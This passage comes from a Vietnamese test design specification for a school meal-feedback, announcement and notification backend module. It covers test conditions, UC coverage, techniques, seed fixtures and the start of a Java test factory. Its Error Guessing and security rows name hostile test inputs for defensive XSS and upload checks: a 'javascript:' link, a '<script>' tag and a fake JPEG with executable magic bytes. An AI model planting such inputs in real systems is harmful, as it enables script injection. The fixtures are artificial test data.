| `traceability_matrix.md` **§1.10** | **15 UC** — UC-085, UC-086, UC-046, UC-017, UC-089, UC-105, UC-125, UC-126, UC-088, UC-058, UC-136, UC-161, UC-162, UC-163, UC-164. Nguồn chuẩn duy nhất cho cặp UC↔BR↔MSG; **không** lấy UC/BR từ `Report 3.md` phụ lục. |
| `business_rules.md` §13 | **BR-138** (cảnh báo ATTP quan trọng **phát ngay**, không qua phê duyệt), **BR-139** (cửa sổ **24 giờ** kể từ khi bữa ăn **được phục vụ**), **BR-140** (phụ huynh chấm **dưới 3 sao** → **bắt buộc** tag quan ngại chất lượng), **BR-141** (tự động biên soạn biểu đồ tổng hợp **hàng tuần**, gửi quản lý catering + BGH), **BR-142** (tự động phân tích **từ khóa bệnh lý** → cảnh báo khẩn + báo **Medical Staff**), **BR-143** (**Service Caterers** trả lời phản hồi), **BR-144** (mỗi lần cập nhật thông báo tạo **mục lịch sử sửa đổi** kèm timestamp + **ID người thực hiện**), **BR-145** (dữ liệu phản hồi **tổng hợp ẩn danh**) |
| `business_rules.md` §14 | **BR-158** (quiet hours mặc định **22:00–06:00**, chặn push **không khẩn**; cảnh báo khẩn **không bị ảnh hưởng**), **BR-158b** (người dùng **cấu hình được** giờ yên tĩnh), **BR-159** (push thất bại → **tự động thử lại**; hết lượt → **email dự phòng**) |
| `error_message.md` | Error: **MSG-004**, **MSG-005**, **MSG-022** · Success: **MSG-029**, **MSG-046**, **MSG-047** · Alert: **MSG-057**, **MSG-058**. ❌ **Không dùng**: MSG-071/072/074 (thuộc module **Menu** — CF-M10-1) |
| `00_Common_Conventions.md` | **D1** định danh · **D2** envelope · **D3** `/api/v1` · **D4** ISO-8601 · **D5** client-supplied id (**nêu đích danh `FB-${Date.now()}`**) · **D6** enum chung (**`NotificationType` 7 giá trị — ghi đè TDS**; `MealType`; `RoleKey` kebab-case) · **D7** message tiếng Anh · **D9** BaseEntity · **D10** StorageService (**MF10 có tên trong danh sách**) · *(D8 contract test — pending)* |
| `review.md` §H | **H1** `mealType` tiếng Việt · **H2** ẩn danh (**giữ TDS**) · **H3** `illnessKeyword` tính ở client · **H4** thiếu khóa liên kết · **H5** hai taxonomy notification · **H6** `recipientRoles` hai bộ định danh · **H7** thiếu `audienceCodes` · **H8** `publishedAt` `""` vs `null` · **H9** `revisionCount` · **H10** 5 endpoint chưa có màn (backlog FE, **không** chặn test backend) |
| `TDS-MF10_Backend.md` §17.1 | **C1** paged + SEARCH_FIELDS · **C2** JWT-first + chủ sở hữu · **C3** BR-139 từ `servedAt` · **C4** BR-140 (service **và** DB) · **C5** BR-142 bảng từ khóa + MSG-057/058 · **C6** BR-144 append-only + cấm `PUBLISHED→DRAFT` · **C7** BR-145 hai DTO · **C8** `NotificationPort` là cửa duy nhất · **C9** `audienceCodes`/`audienceLabel` |
| `00_Team_Work_Assignment_Plan.md` §2b | Hợp đồng phân trang: 5 field, `pageCount ≥ 1`, `page` clamp, tập rỗng → **200** không 404, `search` chỉ trên `SEARCH_FIELDS`. ⚠️ **§2b-5 ghi sai `SEARCH_FIELDS` của MF10** (`title, senderName, content` — 3 field **không tồn tại** trên entity `Feedback`) → TDS CF-M10-8 khai lại: `comment, dish_name, class_name`. Xem **F4** (§8.1) |
| `semantic-audit.ts` | **0 luật** chạm MF10 (grep `feedback|announce|notification` → không kết quả). ⚠️ Nghĩa là module này **không có lưới an toàn thứ hai** như MF05/MF07/MF08/MF09/MF11 → `MF10-TC-INT-016` thay thế bằng **8 invariant dựng trực tiếp từ BR**, mỗi invariant ghi rõ BR nguồn (tránh AP-AI-001). Ghi **F7** (§8.1) |

### TDS-03 — Test Conditions and Coverage Items

| Condition ID | Test Condition | Coverage Item | Test Cases |
|-------------|---------------|---------------|-----------|
| TC-COND-001 | Cửa sổ phản hồi **24 giờ** tính từ `servedAt` (MF09); server enforce, không tin client (BR-139, **L10/CF-M10-11**) | `FeedbackWindowPolicy` · `MealServingPort` | `MF10-TC-001`, `MF10-TC-INT-002` |
| TC-COND-002 | BR-139 áp cho **cả** `PATCH` và `DELETE`, không chỉ `POST` (UC-046 AF1/AF2 + **EX1: "nếu edit qua API"**) | `FeedbackService.update()/retract()` | `MF10-TC-002`, `MF10-TC-INT-005` |
| TC-COND-003 | Rating < 3 (Parent) ⇒ `tags` không rỗng; enforce ở service **và** DB (BR-140) | `QualityTagRule` · `ck_fb_low_rating_needs_tag` | `MF10-TC-003`, `MF10-TC-INT-003` |
| TC-COND-004 | BR-140 **không** áp cho Teacher — traceability UC-086 chỉ có BR-139 (**CF-M10-3**) | `QualityTagRule` | `MF10-TC-004` |
| TC-COND-005 | Dò từ khóa bệnh lý từ bảng `illness_keywords`, không dấu + không phân biệt hoa/thường (BR-142, ADR-M10-6) | `IllnessKeywordDetector` | `MF10-TC-005` |
| TC-COND-006 | Backend **tính lại** `illnessKeyword`, **bỏ qua** giá trị client gửi (BR-142, **L9/H3**) | `FeedbackService.submit()` | `MF10-TC-006`, `MF10-TC-INT-001` |
| TC-COND-007 | `rating < 3` → notification **MSG-057** tới `service-caterers`; `illnessKeyword` → **MSG-058** critical tới `medical-staff` — **hai nhánh độc lập** (BR-140/142, **CF-M10-9**) | `NotificationPort` + `submit()` | `MF10-TC-007`, `MF10-TC-INT-001` |
| TC-COND-008 | DTO danh sách/tổng hợp **không** mang `studentId`/`student`/`submitterName` (BR-145, **L11/H2**) | `FeedbackListItemMapper` | `MF10-TC-008`, `MF10-TC-SEC-002`, `MF10-TC-INT-007` |
| TC-COND-009 | Ngoại lệ BR-142: Medical Staff xem danh tính **chỉ** với `illnessKeyword=true`, **có audit** (ADR-M10-5) | `FeedbackService.getDetail()` | `MF10-TC-009`, `MF10-TC-SEC-003` |
| TC-COND-010 | Mỗi create/update announcement **append** 1 revision kèm timestamp + `revisedByUserId` (BR-144) | `AnnouncementService` · `announcement_revisions` | `MF10-TC-010`, `MF10-TC-011`, `MF10-TC-INT-012` |
| TC-COND-011 | FSM Announcement: `DRAFT→PUBLISHED` đặt `publishedAt`; **`PUBLISHED→DRAFT` bị cấm** (TDS §6.5) | `AnnouncementStatus` guard | `MF10-TC-012`, `MF10-TC-INT-012` |
| TC-COND-012 | `publishedAt = null` khi DRAFT (**không** chuỗi rỗng); `ck_ann_published_at` (**L14/H8**) | Entity + CHECK | `MF10-TC-013`, `MF10-TC-INT-015` |
| TC-COND-013 | BR-138: thông báo khẩn phát **ngay**, bỏ qua quiet hours **và** bỏ qua cờ tắt theo loại | `NotificationDispatcher` | `MF10-TC-014`, `MF10-TC-INT-018` |
| TC-COND-014 | Quiet hours mặc định **22:00–06:00** hoãn push thường (BR-158) | `QuietHoursPolicy` | `MF10-TC-015` |
| TC-COND-015 | Quiet hours **cá nhân hóa** ghi đè mặc định (BR-158b, UC-088) | `QuietHoursPolicy` + `NotificationPreference` | `MF10-TC-016`, `MF10-TC-INT-014` |
| TC-COND-016 | Push thất bại → retry ≤3 → **email dự phòng**; `emailFallback=false` → dừng ở `FAILED` (BR-159) | `DeliveryRetryScheduler` | `MF10-TC-017`, `MF10-TC-INT-018` |
| TC-COND-017 | `NotificationType` = **7 giá trị D6**; `critical` **dẫn xuất** từ type, không lưu cột (**L2/H5**) | `common/enums/NotificationType` | `MF10-TC-018`, `MF10-TC-INT-015` |
| TC-COND-018 | `MealType` SCREAMING_SNAKE từ `common/enums`, từ chối `"Bữa trưa"` (**L4/H1**) | `common/enums/MealType` | `MF10-TC-019` |
| TC-COND-019 | `RoleKey` kebab-case trong `recipientRoles` (**L3/H6**) | `common/enums/RoleKey` | `MF10-TC-020`, `MF10-TC-INT-013` |
| TC-COND-020 | Mọi field ngày là ISO-8601; `submittedAt` do **server** đặt (**L14/D4**) | Jackson config + DTO | `MF10-TC-021`, `MF10-TC-INT-009` |
| TC-COND-021 | `id` công khai = mã nghiệp vụ (`FB-`/`ANN-`/`NTF-`/`FBR-`); `SEARCH_FIELDS` map qua `@JsonProperty` (**L1/D1**) | Toàn bộ DTO + `FeedbackSpec` | `MF10-TC-022`, `MF10-TC-INT-009` |
| TC-COND-022 | UC-163: nội dung trả lời không rỗng (EX1); >48h với đánh giá tiêu cực → `lateResponse=true` **không chặn** (EX2) | `FeedbackResponseService.respond()` | `MF10-TC-023`, `MF10-TC-INT-006` |
| TC-COND-023 | Announcement lọc theo `audienceCodes`, hiển thị theo `audienceLabel` (**L12/H7**, C9) | `AnnouncementSpec` | `MF10-TC-024`, `MF10-TC-SEC-004` |
| TC-COND-024 | UC-085 end-to-end: 201 + MSG-046 + 2 notification + audit | `POST /feedbacks` | `MF10-TC-INT-001` |
| TC-COND-025 | Một người chỉ phản hồi **một lần** cho (phiên ăn × món × HS); race 2 request | `uq_fb_once` | `MF10-TC-INT-004` |
| TC-COND-026 | Rút phản hồi = **soft delete**; không trả ở list nhưng còn trong DB (§4.2 TDS) | `retract()` · `deleted_at` | `MF10-TC-INT-005` |
| TC-COND-027 | UC-164 dashboard **ẩn danh**, chi tiết tối đa tới **mức lớp**; job tuần BR-141 phát digest | `FeedbackDashboardService` · `WeeklyFeedbackDigestJob` | `MF10-TC-INT-007` |
| TC-COND-028 | Hợp đồng phân trang §2b trên **3 resource** MF10 | `PagedResponse<T>` + Spec | `MF10-TC-INT-008` |
| TC-COND-029 | Envelope lỗi đủ 3 field, `details` không null, message tiếng Anh (**D2/D7/L5/L6**) | `@RestControllerAdvice` | `MF10-TC-INT-010` |
| TC-COND-030 | Client gửi `id` (`FB-…`) → dùng làm `code`, trùng → 409 (**D5/L15**) | `POST /feedbacks` | `MF10-TC-INT-011` |
| TC-COND-031 | `announcement_revisions` **bất biến**: RULE chặn UPDATE/DELETE (BR-144, ADR-M10-3) | Flyway RULE | `MF10-TC-INT-012` |
| TC-COND-032 | Trạng thái đọc theo **từng người** (`notification_reads`), không phải cờ toàn cục (**CF-M10-10**) | `NotificationService.markRead()` | `MF10-TC-INT-013` |
| TC-COND-033 | UC-088 preference lưu bền; loại **CRITICAL** không tắt được về mặt dispatch (BR-138) | `NotificationPreferenceService` | `MF10-TC-INT-014` |
| TC-COND-034 | Schema: **không** cột dẫn xuất (`critical`, `revisionCount`, `responded`, `editableUntil`); **có** đủ cột `review.md` §H đòi | Flyway migration | `MF10-TC-INT-015` |
| TC-COND-035 | 8 invariant dựng từ BR thay cho `semantic-audit.ts` (module không có luật nào) | CHECK + service | `MF10-TC-INT-016` |
| TC-COND-036 | `created_by`/`updated_by` do `AuditorAware` điền; khác `author_user_id` (**D9/L16**) | `BaseEntity` | `MF10-TC-INT-017` |
| TC-COND-037 | RBAC 7 role đúng §16: Parent/Teacher gửi · Caterer trả lời · BGH dashboard + announcement | `@PreAuthorize` | `MF10-TC-SEC-001`, `MF10-TC-SEC-002`, `MF10-TC-SEC-008` |
| TC-COND-038 | Announcement `DRAFT` **không** lộ cho vai ngoài School Administration; audience khớp vai (**CF-M10-6/L12**) | `listForAudience()` | `MF10-TC-SEC-004` |
| TC-COND-039 | `revisions[]` chỉ ở detail và chỉ cho School Administration (**L13/H9**) | `AnnouncementService.getDetail()` | `MF10-TC-SEC-005` |
| TC-COND-040 | `content` announcement **sanitize XSS**; `link` notification chỉ path nội bộ (§4.3 TDS) | Sanitizer + validator | `MF10-TC-SEC-006`, `MF10-TC-SEC-007` |
| TC-COND-041 | Log **không** chứa nội dung phản hồi (PDPD, §4.3 TDS) | Logging config | `MF10-TC-SEC-008` |
| TC-COND-042 | Upload đính kèm phản hồi qua `StorageService`, whitelist + magic bytes (**D10/L8**) | `FeedbackAttachmentService` | `MF10-TC-SEC-009` |
| TC-COND-043 | *(D8 — pending)* `/v3/api-docs` không lộ UUID, 4xx trỏ `ErrorResponse`, enum khớp D6 | OpenAPI spec | `MF10-TC-SEC-010` |

### TDS-03b — Bản đồ phủ 15 UC (đối chiếu traceability §1.10)

> Bảng để **Huy** kiểm nhanh: mọi UC ở §1.10 có ít nhất một test case, và mọi BR ở cột Business Rules của UC đó có oracle. Cột **Nguồn hành vi** ghi rõ UC nào **thiếu spec** (L17/CF-M10-2) để không ai tưởng test được suy ra từ Normal Flow.

| UC ID | Tên UC | BR (§1.10) | Nguồn hành vi | Test case phủ |
|---|---|---|---|---|
| **UC-085** | Submit Meal & Food Quality Feedback | BR-139, 140, 142 | UC spec + mock (2 màn) | `TC-001` (BR-139), `TC-003` (BR-140), `TC-005`/`TC-006` (BR-142), `TC-007` (MSG-057/058), `TC-019` (mealType), `TC-INT-001` (E2E + MSG-046), `TC-INT-002` (MSG-022), `TC-INT-004` (trùng), `TC-INT-011` (D5) |
| **UC-086** | Submit Meal Feedback | **BR-139** *(chỉ)* | UC spec; **chưa có màn FE** | `TC-004` (⭐ BR-140 **không** áp), `TC-001` (BR-139 dùng chung), `TC-INT-015` (cột `portion_size`) |
| **UC-046** | Manage Meal Feedback | BR-139, 141, 143 | UC spec (AF1/AF2); **mock chỉ có lịch sử, không có Edit/Delete** — H10 | `TC-002` (BR-139 cho PATCH/DELETE), `TC-INT-005` (soft delete), `TC-INT-006` (xem trả lời — BR-143), `TC-SEC-001` (chỉ chủ sở hữu) |
| **UC-017** | Create Announcement | BR-138, 144 | UC spec + handler riêng `mock-server.ts:142` | `TC-010` (revision "Công bố lần đầu"), `TC-013` (DRAFT → `publishedAt=null`), `TC-014` (BR-138 urgent), `TC-024` (audienceCodes), `TC-INT-012` |
| **UC-089** | Update Announcement | BR-144 | UC spec + handler riêng `mock-server.ts:162` | `TC-010`, `TC-011` (ID người thực hiện), `TC-012` (cấm `PUBLISHED→DRAFT`), `TC-INT-012` (RULE append-only) |
| **UC-105** | View Announcement Detail | — | UC spec + `announcement-detail.tsx` | `TC-SEC-005` (⭐ `revisions[]` chỉ School Admin — BR-144 + phân quyền), `TC-INT-008` |
| **UC-125** | View List Announcement | — | UC spec + `school-admin/announcements` | `TC-024`, `TC-INT-008` (paged), `TC-SEC-005` (`revisionCount` ở list) |
| **UC-126** | View List Announcements | — | ⚠️ **thiếu UC spec** — thiết kế theo `announcement-list.tsx` + phân quyền BR-007 | `TC-SEC-004` (⭐ Parent không thấy DRAFT/sai audience), `TC-024` |
| **UC-088** | Manage Notification Preferences | BR-158, **BR-158b** | ⚠️ **thiếu UC spec** — thiết kế theo `notification-settings/page.tsx` (7 loại + 3 CRITICAL) + BR-158b | `TC-016` (quiet hours cá nhân), `TC-018` (7 giá trị D6), `TC-INT-014` (lưu bền + CRITICAL không tắt được) |
| **UC-058** | Receive Notification | BR-138, 158, 159 | ⚠️ **thiếu UC spec** — thiết kế theo `lib/notify.ts` + BR-138/158/159 | `TC-014` (BR-138), `TC-015` (BR-158), `TC-017` (BR-159), `TC-020` (RoleKey), `TC-INT-018` (retry + Mailpit) |
| **UC-136** | View Notification History | — | ⚠️ **thiếu UC spec** — thiết kế theo `notification-bell.tsx` (pageSize 50, lọc theo vai) | `TC-INT-013` (⭐ `read` theo từng người — CF-M10-10), `TC-INT-008` |
| **UC-161** | View List Meal Feedback | BR-140, 142 | UC spec + `school-admin/feedback` | `TC-008` (ẩn danh), `TC-INT-007`, `TC-INT-008` (lọc `illnessKeyword=true`, `rating`), `TC-SEC-002` |
| **UC-162** | View Meal Feedback Detail | BR-145 | UC spec (*"hiding the identity of the submitter"*) | `TC-008`, `TC-009` (ngoại lệ Medical Staff), `TC-SEC-002`, `TC-SEC-003` |
| **UC-163** | Respond Meal Feedback | BR-143 | UC spec; **chưa có màn FE** — H10/CF-M10-4 | `TC-023` (EX1 rỗng, EX2 >48h), `TC-INT-006` (E2E + notify người gửi), `TC-SEC-002` (chỉ Service Caterers) |
| **UC-164** | View Meal Feedback Dashboard | BR-141, 145 | UC spec; mock tính client-side ở `school-admin/feedback` | `TC-INT-007` (⭐ tổng hợp ẩn danh tới mức lớp + job tuần BR-141) |

> ⚠️ **BR-141 xuất hiện ở UC-046 (cột §1.10) nhưng nội dung BR-141 là "biên soạn biểu đồ tổng hợp hàng tuần"** — không liên quan tới việc phụ huynh quản lý phản hồi của mình. Test **không** nhân đôi: BR-141 được phủ ở `TC-INT-007` (UC-164). Ghi **F5** (§8.1) để Huy đối chiếu.
> ⚠️ **BR-143 xuất hiện ở UC-046 lẫn UC-163** — cùng một luật nhìn từ hai phía (phụ huynh **đọc** trả lời / caterer **viết** trả lời). `TC-INT-006` assert cả hai chiều trong một luồng, không tách 2 test.

### TDS-04 — Test Techniques / Kỹ thuật Kiểm thử

| Technique (ISO 29119-4) | Applied To | Rationale |
|------------------------|------------|-----------|
| **Boundary Value Analysis** | BR-139 (**24 giờ** — `servedAt+24h−1s` / `+24h` / `+24h+1s`), BR-140 (**rating 2 / 3**), BR-158 (**21:59 / 22:00 / 05:59 / 06:00** giờ VN), UC-163 EX2 (**48 giờ**) | Bốn ngưỡng này là toàn bộ phần "chặn cứng" của module. Biên BR-158 dễ sai nhất vì quiet hours **vắt qua nửa đêm** (22:00 > 06:00) — so sánh `start <= now <= end` sẽ **luôn sai**, phải là `now >= start || now <= end` |
| **Equivalence Partitioning** | `submitterRole` × `rating` (PARENT/TEACHER × <3 / ≥3) — BR-140 chỉ áp 1 trong 4 lớp; `scope` (DISH/SESSION/CLASS); vai người đọc (chủ sở hữu / BGH / caterer / y tế) quyết định DTO nào | Miền đầu vào chia lớp rõ; đặc biệt lớp (TEACHER, rating<3) là lớp **duy nhất** mà mock và traceability nói ngược nhau (CF-M10-3) |
| **State Transition Testing** | `AnnouncementStatus` (`DRAFT↔PUBLISHED`, có transition **cấm**), `DeliveryStatus` (`QUEUED→DEFERRED/SENT/FAILED→FALLBACK_EMAIL`) | `PUBLISHED→DRAFT` bị cấm vì thông báo đã tới tay phụ huynh — bấm nhầm không rút lại được, phải test cứng. `DeliveryStatus` có nhánh vòng lại (retry) nên dễ kẹt vô hạn nếu thiếu chặn `attempt ≤ 3` |
| **Decision Table Testing** | `dispatch()` = f(`critical`?, `typeEnabled[type]`?, trong quiet hours?) → {SENT ngay, DEFERRED, bỏ qua}; `submit()` = f(trong 24h?, rating<3?, tags rỗng?) | 3 điều kiện độc lập quyết định 1 kết quả; bảng quyết định gọn hơn 8 test rời và lộ ngay ô nào chưa có oracle |
| **Error Guessing** | Client gửi `illnessKeyword=false` kèm nội dung có từ khóa (**L9**); gửi `submittedAt` giả; gửi `studentId` của con người khác; `mealType: "Bữa trưa"`; `link: "javascript:…"`; `<script>` trong `content` | Nhắm đúng lớp lỗi mà mock **không** chặn được vì mọi quyết định đang nằm ở client (`review.md` H3/H4) |
| **Negative/Absence Testing** ⭐ | BR-145 — assert **field KHÔNG có mặt** trong response (`studentId`, `student`, `submitterName`) ở 4 endpoint × 3 vai | Đây là kiểu test dễ **xanh giả** nhất (thiếu field vì chưa implement ≠ đã ẩn danh) → mọi test loại này bắt buộc có **tiền đề khẳng định** trước: assert bản ghi **có** dữ liệu ở DB rồi mới assert response **không** có (xem §5.1) |
| **Concurrency / Race Testing** | 2 request `POST /feedbacks` cùng `(submitterUserId, mealSessionId, dishId, studentId)`; 2 request `markRead` cùng `(notificationId, userId)` | Bất biến "1 phản hồi / bữa / món" và "1 dòng `notification_reads`" chỉ chắc chắn khi có unique index, không phải check-then-act ở service |

### TDS-05 — Test Data Requirements

> Seed gốc: `mock-data.ts` — **3 `FEEDBACKS`** (`FB-8812`, `FB-8809`, `FB-8801`), **4 `ANNOUNCEMENTS`** (`ANN-109`…`ANN-112`, kèm `revisions[]`), **5 `NOTIFICATIONS`** (`NTF-895`…`NTF-901`), **10 `ILLNESS_KEYWORDS`** → `V{n}__seed_mf10.sql`.
> ⚠️ Seed **phải quy đổi** khi sinh SQL: mọi mốc thời gian sang **ISO** (D4); `mealType` tiếng Việt → `LUNCH` (D6/L4); `recipientRoles` giữ **kebab-case** (đã đúng — D6/L3); `type` của 5 notification **quy đổi sang 7 giá trị D6** (L2 — xem bảng dưới); `dish` (tên) → `dish_id` + `dish_name`; bổ sung `meal_session_id` (mock **không có** — L10).

| Fixture ID | Type | Value / Logic | Mục đích |
|-----------|------|---------------|---------|
| `FX-001` | clock | `Clock.fixed("2026-07-01T14:00:00Z", UTC)` → **21:00 ngày 01/07/2026 giờ VN** | Ngưỡng BR-139/BR-158 phải **tất định**; không dùng `Instant.now()` (test sẽ vỡ theo ngày chạy). Chọn 21:00 VN vì nằm **ngay trước** quiet hours 22:00 → dịch 1 giờ là đổi nhánh, lộ ngay lỗi biên |
| `FX-002` | stub `ReferenceResolver` *(🔴 `M10-D06` — bản v1.0 ghi "port stub `MealServingPort`")* | `servedAtOf()`: `MS-20260701-L` → `servedAt=2026-07-01T03:45:00Z` (**10:45 VN 01/07**, còn ~6h45 trong cửa sổ) · `MS-20260630-L` → `2026-06-30T03:50:00Z` (**quá 24h**) · `MS-9999` → `Optional.empty()` | 3 lớp tương đương của BR-139 (trong / ngoài / phiên không tồn tại) |
| `FX-003` | DB seed | `FB-8812` — `HS-3A-001`, lớp `3A`, `LUNCH`, `dish_id=DISH-021` "Cá basa sốt cà chua", `rating=5`, `tags=[]`, `illness_keyword=false`, `meal_session_id=MS-20260701-L` | Phản hồi **tích cực trong cửa sổ** — nhánh sửa/xóa hợp lệ (UC-046 AF1/AF2) |
| `FX-004` | DB seed | `FB-8809` — `HS-3A-001`, `rating=2`, `tags=["Món ăn nguội","Khẩu phần ít"]`, `comment="Con về kêu đau bụng nhẹ buổi chiều."`, `illness_keyword=true`, `meal_session_id=MS-20260630-L` | ⭐ Bản ghi trung tâm: **đồng thời** <3 sao (MSG-057) **và** có từ khóa bệnh lý (MSG-058), **và** đã ngoài cửa sổ 24h tại `FX-001` → nhánh MSG-022 + ngoại lệ Medical Staff (`TC-009`) |
| `FX-005` | DB seed | `FB-8801` — `HS-3A-002` (**học sinh khác**), `rating=4`, `illness_keyword=false`, `submitter_user_id=U-PARENT-002` | Nhánh **cross-owner** (`TC-SEC-001`) + mẫu số thứ hai cho dashboard theo lớp |
| `FX-006` | DB seed | `ANN-112` — `PUBLISHED`, `audience_codes=["PARENT_ALL"]`, `audience_label="Phụ huynh toàn trường"`, **1 revision**, `urgent=false` | UC-089 (append revision lần 2) + `revisionCount=1` ở list |
| `FX-007` | DB seed | `ANN-111` — `PUBLISHED`, `urgent=**true**`, `audience_codes=["PARENT_GRADE_3"]`, **3 revisions**, `author="Ngô Thị Hà (Y tế)"` | BR-138 (khẩn) + `revisions[]` nhiều mục (`TC-SEC-005`) + lọc audience theo khối (`TC-SEC-004`) |
| `FX-008` | DB seed | `ANN-113` — **`DRAFT`**, `published_at=NULL`, `audience_codes=["TEACHER"]`, 1 revision "Công bố lần đầu" | ⭐ Nhánh **DRAFT không được lộ** (`TC-SEC-004`) + `publishedAt=null` (`TC-013`) |
| `FX-009` | DB seed | `notifications`: `NTF-901` (`ALLERGY_ALERT`, roles `["medical-staff"]`) · `NTF-900` (`INCIDENT_ALERT`, `["medical-staff","school-admin"]`) · `NTF-899` (`CAPA_ASSIGNED`, `["school-admin"]`) · `NTF-897` (`MENU_PUBLISHED`, `["school-admin"]`) · `NTF-895` (`audience=ALL`, `EXPIRY_ALERT`) | ⚠️ **Đã quy đổi sang 7 giá trị D6** (L2): mock `ALLERGY`→`ALLERGY_ALERT`, `FOOD_SAFETY`→`INCIDENT_ALERT`, `NEWS`→`MENU_PUBLISHED`, `SYSTEM`→`EXPIRY_ALERT`. Ánh xạ này là **quy đổi seed**, không phải hợp đồng badge — xem **F1** (§8.1) |
| `FX-010` | DB seed | `notification_reads`: (`NTF-899`, `U-ADMIN-001`) đã đọc; `NTF-901` **chưa ai đọc** | `TC-INT-013` — `read` theo từng người (CF-M10-10) |
| `FX-011` | DB seed | `illness_keywords`: đúng **10 từ** của `mock-data.ts:2716` — `đau bụng, buồn nôn, nôn, tiêu chảy, dị ứng, nổi mẩn, ngứa, sốt, ngộ độc, khó thở` | BR-142 — **không** hardcode trong Java (ADR-M10-6) |
| `FX-012` | DB seed | `notification_preferences`: `U-CATERER-001` → `{EXPIRY_ALERT:false, INCIDENT_ALERT:false, còn lại true}`, `quiet=22:00–06:00` · `U-TEACHER-001` → `quiet=**21:00–07:00**`, `emailFallback=false` | BR-158b (quiet hours cá nhân) + BR-159 (tắt email) + BR-138 (tắt `INCIDENT_ALERT` **vẫn phải nhận** vì critical) |
| `FX-013` | stub | `ParentChildPort`: `U-PARENT-001` → `[HS-3A-001]` · `U-PARENT-002` → `[HS-3A-002]` | Kiểm quyền §4.3 TDS (`TC-SEC-001`) |
| `FX-014` | mock | `StorageService` (Mockito) — assert `store(key, file)` được gọi, key khớp khuôn `"feedbacks/<code>.<ext>"` (D10) | D10/L8 |
| `FX-015` | stub | `PushGateway`: `U-ADMIN-001` → thành công · `U-CATERER-001` → **ném `PushDeliveryException` 3 lần** rồi thành công · `U-TEACHER-001` → **luôn thất bại** | BR-159 — 3 nhánh retry/fallback/dừng |
| `FX-016` | file | `phan-anh-suat-an.jpg` (280 KB, magic `\xFF\xD8\xFF`) · `oversize.jpg` (12 MB) · `fake.jpg` (magic `MZ`) | Biên MSG-008/009 + Error Guessing (`TC-SEC-009`) |
| `FX-017` | JWT | `{ sub:"U-PARENT-001", role:"parent", schoolId:"SCH-HN-0042", fullName:"Nguyễn Văn Bình" }` | Actor phụ huynh — gửi/sửa/xóa phản hồi cho `HS-3A-001` |
| `FX-018` | JWT | `{ sub:"U-TEACHER-001", role:"teacher", schoolId:"SCH-HN-0042" }` · `{ sub:"U-CATERER-001", role:"service-caterers", … }` · `{ sub:"U-ADMIN-001", role:"school-admin", … }` · `{ sub:"U-MEDICAL-001", role:"medical-staff", … }` | 4 vai còn lại của §16 |
| `FX-019` | JWT | `{ sub:"U-PARENT-050", role:"parent", schoolId:"**SCH-HN-0051**" }` · `{ sub:"U-SUPPLIER-001", role:"supplier", … }` | Cross-school (`TC-SEC-003`) + vai không có quyền (`TC-SEC-002`) |

---

## 4. Test Case Specification

> **TC ID format:** `MF10-TC-[NNN]` (unit) · `MF10-TC-SEC-[NNN]` (security) · `MF10-TC-INT-[NNN]` (integration)
> **Severity:** CRITICAL / HIGH / MEDIUM / LOW
> **Status:** 🔴 Not written / 🟡 Written-failing / 🟢 Passing

### Props Isolation Boilerplate (CASE 2.0 — BẮT BUỘC)

> ⭐ **CASE 2.0 Rule:** Mỗi test PHẢI tạo fresh instance qua factory. Không shared mutable state giữa các test case. Đây là biện pháp chống **AP-AI-002 (Green-from-Birth)**.
> Bản Java tương đương pattern `makeEntity()` của template (template viết bằng TypeScript — **KHÔNG copy nguyên cú pháp đó**, sai stack theo Team Plan §2c-2).

```java
// ═══════════════════════════════════════════════════════════════
// CASE 2.0 — Props Isolation Pattern (Java / JUnit 5)
// src/test/java/com/sfms/mf10/FeedbackTestFactory.java   (M10-D03)
// Mỗi @Test gọi factory → object mới, KHÔNG dùng field static mutable
// ═══════════════════════════════════════════════════════════════
public final class FeedbackTestFactory {

    /** FX-001 — 21:00 ngày 01/07/2026 giờ VN. Ngưỡng BR-139/BR-158 phải tất định. */
    public static final Clock FIXED_CLOCK =
        Clock.fixed(Instant.parse("2026-07-01T14:00:00Z"), ZoneOffset.UTC);

    /** Múi giờ nghiệp vụ — BR-158 nói "22:00–06:00" là giờ ĐỊA PHƯƠNG, không phải UTC. */
    public static final ZoneId SCHOOL_ZONE = ZoneId.of("Asia/Ho_Chi_Minh");

    /** BR-139 — 24 giờ. KHÔNG hardcode 24 rải rác trong test. */
    public static final Duration FEEDBACK_WINDOW = Duration.ofHours(24);

    /** UC-163 EX2 — ngưỡng ghi nhận trả lời trễ. */
    public static final Duration LATE_RESPONSE_AFTER = Duration.ofHours(48);

    private FeedbackTestFactory() {}

    /** Baseline hợp lệ — đồng bộ FX-003. Mỗi lời gọi trả instance MỚI. */
    public static Feedback aFeedback(Consumer<Feedback> overrides) {
        Feedback f = new Feedback();
        f.setCode("FB-8812");                                  // D1 — id công khai là mã nghiệp vụ (L1)
        f.setSchoolId(UUID.randomUUID());
        f.setSubmitterUserId(UUID.randomUUID());
        f.setSubmitterRole(SubmitterRole.PARENT);
        f.setScope(FeedbackScope.DISH);
        f.setStudentId(UUID.randomUUID());
        f.setClassName("3A");                                  // SEARCH_FIELDS (CF-M10-8)
        f.setMealDate(LocalDate.parse("2026-07-01"));          // D4 — ISO (L14)
        f.setMealType(MealType.LUNCH);                         // D6 — common/enums (L4)
        f.setMealSessionId(UUID.randomUUID());                 // L10 — mốc BR-139
        f.setDishId(UUID.randomUUID());
        f.setDishName("Cá basa sốt cà chua");
        f.setRating(5);
        f.setTagsJson("[]");
        f.setComment("Con ăn hết suất, khen ngon.");
        f.setIllnessKeyword(false);                            // L9 — server tự tính, đây chỉ là state sau khi tính
        f.setSubmittedAt(Instant.parse("2026-07-01T12:30:00Z"));
        overrides.accept(f);
        return f;
    }

    /** Payload gửi phản hồi — mặc định HỢP LỆ; mỗi test chỉ đổi đúng field đang kiểm. */
    public static SubmitFeedbackRequest aSubmitRequest(Consumer<SubmitFeedbackRequest> overrides) {
        SubmitFeedbackRequest r = new SubmitFeedbackRequest();
        r.setMealSessionId("MS-20260701-L");                   // FX-002 — trong cửa sổ (L10)
        r.setStudentId("HS-3A-001");
        r.setScope("DISH");
        r.setMealDate("2026-07-01");                           // D4
        r.setMealType("LUNCH");                                // D6 — KHÔNG "Bữa trưa" (L4/H1)
        r.setDishId("DISH-021");                               // L10 — khoá, không phải tên món
        r.setRating(5);
        r.setTags(List.of());
        r.setComment("Con ăn hết suất, khen ngon.");
        overrides.accept(r);
        return r;
    }

    /** FX-006 — announcement đã công bố, 1 revision. */
    public static Announcement anAnnouncement(Consumer<Announcement> overrides) {
        Announcement a = new Announcement();
        a.setCode("ANN-112");                                  // D1
        a.setSchoolId(UUID.randomUUID());
